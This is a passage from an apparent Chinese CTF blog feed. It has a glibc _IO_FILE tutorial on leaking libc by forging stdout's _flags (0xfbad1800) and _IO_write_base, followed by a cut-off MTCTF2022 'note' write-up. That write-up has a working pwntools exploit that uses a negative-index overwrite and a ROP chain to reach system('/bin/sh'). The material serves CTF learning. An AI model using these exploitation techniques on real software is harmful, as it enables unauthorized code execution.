        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>Dest0g3-520迎新赛</tag>
      </tags>
  </entry>
  <entry>
    <title>IO_FILE-leak</title>
    <url>/2022/06/14/IO-FILE-leak/</url>
    <content><![CDATA[<p>利用_IO_2_1_stdout泄露libc</p>
<span id="more"></span>

<h1 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h1><p>定义在glibc&#x2F;libio&#x2F;libio.h中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>glibc通过单链表<code>_IO_list_all</code>来管理所有的FILE结构体，每个结点之间用<code>_chain</code>来链接</p>
<p><a href="https://imgtu.com/i/X5450f"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100916781.jpg" alt="X5450f.jpg"></a></p>
<p>在libioP.h中定义如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span>;</span></span><br></pre></td></tr></table></figure>

<h1 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="_IO_FILE_plus"></a>_IO_FILE_plus</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>里面定义了一个_IO_FILE结构体，还有一个虚表 ，里面包含了IO有关的一系列函数指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="flags字段"><a href="#flags字段" class="headerlink" title="_flags字段"></a>_flags字段</h1><p>这个字段在 <code>_IO_2_1_stdout_</code>泄露libc中起到了很重要的作用</p>
<p><a href="https://imgtu.com/i/X5oD00"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100917655.jpg" alt="X5oD00.jpg"></a></p>
<p>红框标记的位置就是_flags字段</p>
<p>flag字段的高两位字节有libc固定，基本都是0xfbad，不过也得看libc的版本，具体情况具体分析就行了</p>
<p>低两位字节决定了程序的执行状态，宏定义如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="comment">/* Magic number */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 <span class="comment">/* Emulate old stdio. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF 1 <span class="comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS 4 <span class="comment">/* Reading not allowed */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8 <span class="comment">/* Writing not allowd */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 <span class="comment">/* Don&#x27;t call close(_fileno) on cleanup. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED 0x80 <span class="comment">/* Set if linked (using _chain) to streambuf::_list_all.*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP 0x100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF 0x200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="comment">/* Set if put and get pointer logicly tied. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF 0x2000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_BAD_SEEN 0x4000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK 0x8000</span></span><br></pre></td></tr></table></figure>

<h1 id="IO-puts"><a href="#IO-puts" class="headerlink" title="_IO_puts"></a>_IO_puts</h1><p>因为利用_IO_2_1_stdout泄露libc主要是针对没有show函数来打印堆块内容的情况，所以我们得尝试找到相应的输出函数并调用它来泄露libc</p>
<p>这里以puts函数为例，来看一下函数执行流程</p>
<p>在libio&#x2F;ioputs.c中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  _IO_size_t len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>_IO_sputn</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br></pre></td></tr></table></figure>

<p>继续跟进<code>_IO_XSPUTN</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)</span></span><br></pre></td></tr></table></figure>

<p>也是一个宏定义，作用是调用<code>_IO_2_1_stdout</code>中虚表指向的<code>_IO_new_file_xsputn</code>函数</p>
<p><code>_IO_new_file_xsputn</code>主要是用来判断缓冲区是否已满或未建立缓冲区，其中调用了<code>_IO_OVERFLOW</code>函数来刷新或者建立缓冲区</p>
<p><a href="https://imgtu.com/i/X5OkgU"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100917770.jpg" alt="X5OkgU.jpg"></a></p>
<h2 id="IO-new-file-overflow"><a href="#IO-new-file-overflow" class="headerlink" title="_IO_new_file_overflow"></a>_IO_new_file_overflow</h2><p>调用<code>_IO_new_file_overflow</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://imgtu.com/i/X5zIHg"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100917263.jpg" alt="X5zIHg.jpg"></a></p>
<p>这里就是为了达到泄露libc最终需要调用的</p>
<p><code>_IO_do_write</code>函数三个参数分别为</p>
<p>stdout结构体，缓冲区基址，输出的size</p>
<p>如果将write_base改掉，就能泄露libc的目的了</p>
<p>接下来往上翻看看要进入这个if分支需要哪些条件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>首先需要跳过这个if分支的条件，就要让<code>f-&gt;_flags &amp; _IO_NO_WRITES</code>等于0</p>
<p>在前面的宏定义里有这个值，为8，所以让<code>f-&gt;_flags &amp; 8</code>等于0即可绕过这个if</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_flags &amp; _IO_NO_WRITES = 0 </span><br><span class="line">_flags = 0xfbad0000</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p>这个if里面会进行一系列初始化的操作，如果进入这个if那我们构造的write_base也会被初始化，就不能达到我们的目的了，所以这里不能进入</p>
<p>后半部分条件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">f-&gt;_IO_write_base == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>

<p>由于我们要构造<code>_IO_write_base</code>，这部分肯定恒为真，只需要看前半部分</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><code>_IO_CURRENTLY_PUTTING</code>宏定义为800</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING = <span class="number">1</span></span><br><span class="line">_flags = <span class="number">0xfbad0800</span></span><br></pre></td></tr></table></figure>

<h2 id="IO-do-new-write"><a href="#IO-do-new-write" class="headerlink" title="_IO_do_new_write"></a>_IO_do_new_write</h2><p>绕过了前面的if之后，成功调用<code>_IO_do_write</code>，继续跟进，调用<code>_IO_do_new_write</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到再绕过前面的else if就能进行系统调用了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">count = _IO_SYSWRITE (fp, data, to_do);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里是个if else if</p>
<p>可以看到绕过else if的条件是<code>fp-&gt;_IO_read_end != fp-&gt;_IO_write_base</code>， 让这两个地址相等，这显然是比较难操作的，我们选择进入if来绕过这个分支</p>
<p>让<code>fp-&gt;_flags &amp; _IO_IS_APPENDING</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_flags &amp; _IO_IS_APPENDING = <span class="number">1</span></span><br><span class="line">_flags = <span class="number">0xfbad1000</span></span><br></pre></td></tr></table></figure>

<p>综上所诉，要绕过所有的条件，_flags的值应该为0xfbad1800，然后设置<code>_IO_write_base</code> 为我们想要的地址即可</p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>MTCTF2022初赛-pwn</title>
    <url>/2022/09/22/MTCTF-2022/</url>
    <content><![CDATA[<p>美团CTF2022初赛pwn</p>
<span id="more"></span>

<h1 id="note"><a href="#note" class="headerlink" title="note"></a>note</h1><p>编辑堆块内容时idx可输入负数，而堆块的控制结构是保存在栈上的，往地址找二级指针即可覆盖返回地址写rop了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line">ip = <span class="string">&#x27;39.106.27.2&#x27;</span></span><br><span class="line">port = <span class="number">45124</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">n</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;5. leave&#x27;</span>, <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, con = <span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;: &#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, con</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">b&#x27;: &#x27;</span>, con)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4017b3</span></span><br><span class="line">start = <span class="number">0x401679</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop_rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(start)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;gdb.attach(io, &#x27;b* 0x40157F&#x27;)</span></span><br><span class="line"><span class="string">pause()&#x27;&#x27;&#x27;</span></span><br><span class="line">edit(-<span class="number">6</span>, payload)</span><br><span class="line">libcbase = uu64() - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libcbase&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh = libcbase + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(ret) + p64(pop_rdi) + p64(sh) + p64(sys_addr)</span><br><span class="line">edit(-<span class="number">6</span>, payload)</span><br><span class="line">ia()</span><br><span class="line"></span><br><span class="line"><span 